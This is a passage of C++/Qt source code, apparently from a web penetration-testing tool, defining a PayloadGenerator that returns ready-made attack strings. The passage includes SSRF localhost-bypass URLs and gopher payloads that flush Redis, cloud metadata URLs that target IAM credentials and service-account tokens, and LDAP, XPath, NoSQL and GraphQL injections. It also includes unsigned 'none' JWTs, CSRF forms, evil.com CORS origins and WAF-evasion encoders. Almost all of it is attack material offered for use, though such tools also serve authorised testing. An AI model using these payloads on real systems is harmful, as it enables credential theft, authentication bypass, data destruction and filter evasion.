        QStringLiteral("http://0x7f.0x0.0x0.0x1"),
        QStringLiteral("http://0177.0.0.1"),
        QStringLiteral("http://2130706433"),
        QStringLiteral("http://0x7f000001"),
        QStringLiteral("http://127.0.0.1.nip.io"),
        QStringLiteral("http://localtest.me"),
        QStringLiteral("http://customer1.app.localhost.my.company.127.0.0.1.nip.io"),
        QStringLiteral("http://127.0.0.1:80@attacker.com"),
        QStringLiteral("http://attacker.com@127.0.0.1"),
        QStringLiteral("http://127.0.0.1#@attacker.com"),
        QStringLiteral("http://127.0.0.1%2523@attacker.com"),
        QStringLiteral("http://127.0.0.1%00@attacker.com"),
        QStringLiteral("http://127。0。0。1"),
        QStringLiteral("http://⑫⑦.⓪.⓪.①"),
        QStringLiteral("http://127%E3%80%820%E3%80%820%E3%80%821"),
        QStringLiteral("http://[0:0:0:0:0:ffff:127.0.0.1]"),
        QStringLiteral("http://[::ffff:127.0.0.1]"),
        QStringLiteral("http://[::]"),
    };
}

QStringList PayloadGenerator::generateSsrfProtocolPayloads() {
    return {
        QStringLiteral("file:///etc/passwd"),
        QStringLiteral("file:///c:/windows/win.ini"),
        QStringLiteral("gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"),
        QStringLiteral("gopher://127.0.0.1:11211/_%0d%0astats%0d%0a"),
        QStringLiteral("dict://127.0.0.1:6379/info"),
        QStringLiteral("dict://127.0.0.1:11211/stats"),
        QStringLiteral("ftp://127.0.0.1"),
        QStringLiteral("sftp://127.0.0.1"),
        QStringLiteral("tftp://127.0.0.1"),
        QStringLiteral("ldap://127.0.0.1"),
        QStringLiteral("ldaps://127.0.0.1"),
        QStringLiteral("jar:http://attacker.com/payload.jar!/"),
        QStringLiteral("netdoc:///etc/passwd"),
    };
}

QStringList PayloadGenerator::generateSsrfCloudMetadataPayloads() {
    return {
        QStringLiteral("http://169.254.169.254/latest/meta-data/"),
        QStringLiteral("http://169.254.169.254/latest/user-data/"),
        QStringLiteral("http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        QStringLiteral("http://169.254.169.254/latest/meta-data/hostname"),
        QStringLiteral("http://169.254.169.254/latest/meta-data/public-ipv4"),
        QStringLiteral("http://169.254.169.254/latest/meta-data/local-ipv4"),
        QStringLiteral("http://169.254.169.254/latest/dynamic/instance-identity/document"),
        QStringLiteral("http://metadata.google.internal/computeMetadata/v1/"),
        QStringLiteral("http://metadata.google.internal/computeMetadata/v1/instance/"),
        QStringLiteral("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
        QStringLiteral("http://metadata.google.internal/computeMetadata/v1/project/"),
        QStringLiteral("http://169.254.170.2/v1/credentials"),
        QStringLiteral("http://169.254.170.2/v2/credentials/"),
        QStringLiteral("http://100.100.100.200/latest/meta-data/"),
        QStringLiteral("http://192.0.0.192/latest/"),
        QStringLiteral("http://169.254.169.254/openstack"),
        QStringLiteral("http://169.254.169.254/metadata/v1/"),
        QStringLiteral("http://169.254.169.254/2009-04-04/meta-data/"),
    };
}

QStringList PayloadGenerator::generateLdapPayloads() {
    return {
        QStringLiteral("*"),
        QStringLiteral("*)(&"),
        QStringLiteral("*)(|"),
        QStringLiteral("*)(objectClass=*"),
        QStringLiteral("*)(uid=*))(|(uid=*"),
        QStringLiteral("admin*)((|userPassword=*"),
        QStringLiteral("*)(userPassword=*"),
        QStringLiteral("*(|(mail=*))"),
        QStringLiteral("*(|(password=*))"),
        QStringLiteral("*)(|(objectclass=*"),
        QStringLiteral(")(cn=*)(|(cn="),
        QStringLiteral(")(uid=*)(|(uid="),
        QStringLiteral("*))%00"),
    };
}

QStringList PayloadGenerator::generateXpathPayloads() {
    return {
        QStringLiteral("' or '1'='1"),
        QStringLiteral("\" or \"1\"=\"1"),
        QStringLiteral("' or ''='"),
        QStringLiteral("\" or \"\"=\""),
        QStringLiteral("'] | //* | //x['"),
        QStringLiteral("\"] | //* | //x[\""),
        QStringLiteral("' and count(/*)=1 and '1'='1"),
        QStringLiteral("' or count(//*)>0 or '"),
        QStringLiteral("x]|//.|//x["),
    };
}

QStringList PayloadGenerator::generateNoSqlPayloads() {
    return {
        QStringLiteral("{\"$gt\": \"\"}"),
        QStringLiteral("{\"$ne\": \"\"}"),
        QStringLiteral("{\"$ne\": 1}"),
        QStringLiteral("{\"$gt\": 0}"),
        QStringLiteral("{\"$where\": \"1==1\"}"),
        QStringLiteral("{\"$regex\": \".*\"}"),
        QStringLiteral("{\"$or\": [{},{}]}"),
        QStringLiteral("[$ne]=1"),
        QStringLiteral("[$gt]="),
        QStringLiteral("[$regex]=.*"),
        QStringLiteral("true, $where: '1 == 1'"),
        QStringLiteral("'; return '' == '"),
    };
}

QStringList PayloadGenerator::generateGraphqlPayloads() {
    return {
        QStringLiteral("{__schema{types{name,fields{name}}}}"),
        QStringLiteral("{__schema{queryType{name}mutationType{name}subscriptionType{name}}}"),
        QStringLiteral("{__schema{directives{name,description,locations,args{name}}}}"),
        QStringLiteral("{__type(name:\"Query\"){name,fields{name,type{name,kind}}}}"),
        QStringLiteral("query{__typename}"),
        QStringLiteral("{user(id:1){id,username,password}}"),
        QStringLiteral("{users{id,username,email,password}}"),
        QStringLiteral("mutation{createUser(username:\"admin\",password:\"admin\"){id}}"),
        QStringLiteral("{systemHealth}"),
        QStringLiteral("{debug}"),
        QStringLiteral("{config{secretKey}}"),
    };
}

QStringList PayloadGenerator::generateJwtPayloads(const QString &header, const QString &payload) {
    Q_UNUSED(header);
    Q_UNUSED(payload);
    return {
        QStringLiteral("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0."),
        QStringLiteral("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0."),
        QStringLiteral("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."),
        QStringLiteral("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0."),
        QStringLiteral("eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0."),
    };
}

QStringList PayloadGenerator::generateCsrfPayloads(const QString &action) {
    return {
        QString(QStringLiteral("<form action=\"%1\" method=\"POST\"><input type=\"submit\"></form>")).arg(action),
        QString(QStringLiteral("<img src=\"%1\">")).arg(action),
        QString(QStringLiteral("<script>fetch('%1',{method:'POST'})</script>")).arg(action),
        QString(QStringLiteral("<iframe src=\"%1\"></iframe>")).arg(action),
        QString(QStringLiteral("<body onload=\"document.forms[0].submit()\"><form action=\"%1\" method=\"POST\"></form></body>")).arg(action),
    };
}

QStringList PayloadGenerator::generateCorsPayloads() {
    return {
        QStringLiteral("null"),
        QStringLiteral("http://evil.com"),
        QStringLiteral("https://evil.com"),
        QStringLiteral("http://localhost"),
        QStringLiteral("http://localhost.evil.com"),
        QStringLiteral("http://target.com.evil.com"),
        QStringLiteral("http://evil-target.com"),
        QStringLiteral("http://targett.com"),
    };
}

QString PayloadGenerator::obfuscatePayload(const QString &payload, const QString &technique) {
    if (technique == QStringLiteral("case")) {
        QString result;
        for (int i = 0; i < payload.length(); ++i) {
            if (i % 2 == 0) result += payload[i].toUpper();
            else result += payload[i].toLower();
        }
        return result;
    }
    if (technique == QStringLiteral("comment")) {
        QString result = payload;
        result.replace(QStringLiteral(" "), QStringLiteral("/**/"));
        return result;
    }
    if (technique == QStringLiteral("newline")) {
        QString result = payload;
        result.replace(QStringLiteral(" "), QStringLiteral("%0a"));
        return result;
    }
    if (technique == QStringLiteral("tab")) {
        QString result = payload;
        result.replace(QStringLiteral(" "), QStringLiteral("%09"));
        return result;
    }
    return payload;
}

QStringList PayloadGenerator::generateWafBypassVariants(const QString &payload) {
    QStringList variants;
    variants << payload;
    variants << obfuscatePayload(payload, QStringLiteral("case"));
    variants << obfuscatePayload(payload, QStringLiteral("comment"));
    variants << obfuscatePayload(payload, QStringLiteral("newline"));
    variants << obfuscatePayload(payload, QStringLiteral("tab"));
    variants << applyEncoding(payload, QStringLiteral("url"));
    variants << applyEncoding(payload, QStringLiteral("double"));
    variants << applyEncoding(payload, QStringLiteral("unicode"));
    return variants;
}

QString PayloadGenerator::applyEncoding(const QString &payload, const QString &encoding) {
    if (encoding == QStringLiteral("url")) {
        return QString::fromUtf8(QUrl::toPercentEncoding(payload));
    }
    if (encoding == QStringLiteral("double")) {
        return QString::fromUtf8(QUrl::toPercentEncoding(QString::fromUtf8(QUrl::toPercentEncoding(payload))));
    }
    if (encoding == QStringLiteral("unicode")) {
        QString result;
        for (const QChar &c : payload) {
            result += QString(QStringLiteral("\\u%1")).arg(c.unicode(), 4, 16, QChar('0'));
        }
        return result;
    }
    if (encoding == QStringLiteral("hex")) {
        QString result;
        QByteArray bytes = payload.toUtf8();
        for (char c : bytes) {
            result += QString(QStringLiteral("\\x%1")).arg(static_cast<unsigned char>(c), 2, 16, QChar('0'));
        }
        return result;
    }
    if (encoding == QStringLiteral("base64")) {
        return QString::fromLatin1(payload.toUtf8().toBase64());
    }
    return payload;
}

QStringList PayloadGenerator::getAllEncodings() {
    return {
        QStringLiteral("url"),
        QStringLiteral("double"),
        QStringLiteral("unicode"),
        QStringLiteral("hex"),
        QStringLiteral("base64"),
    };
}
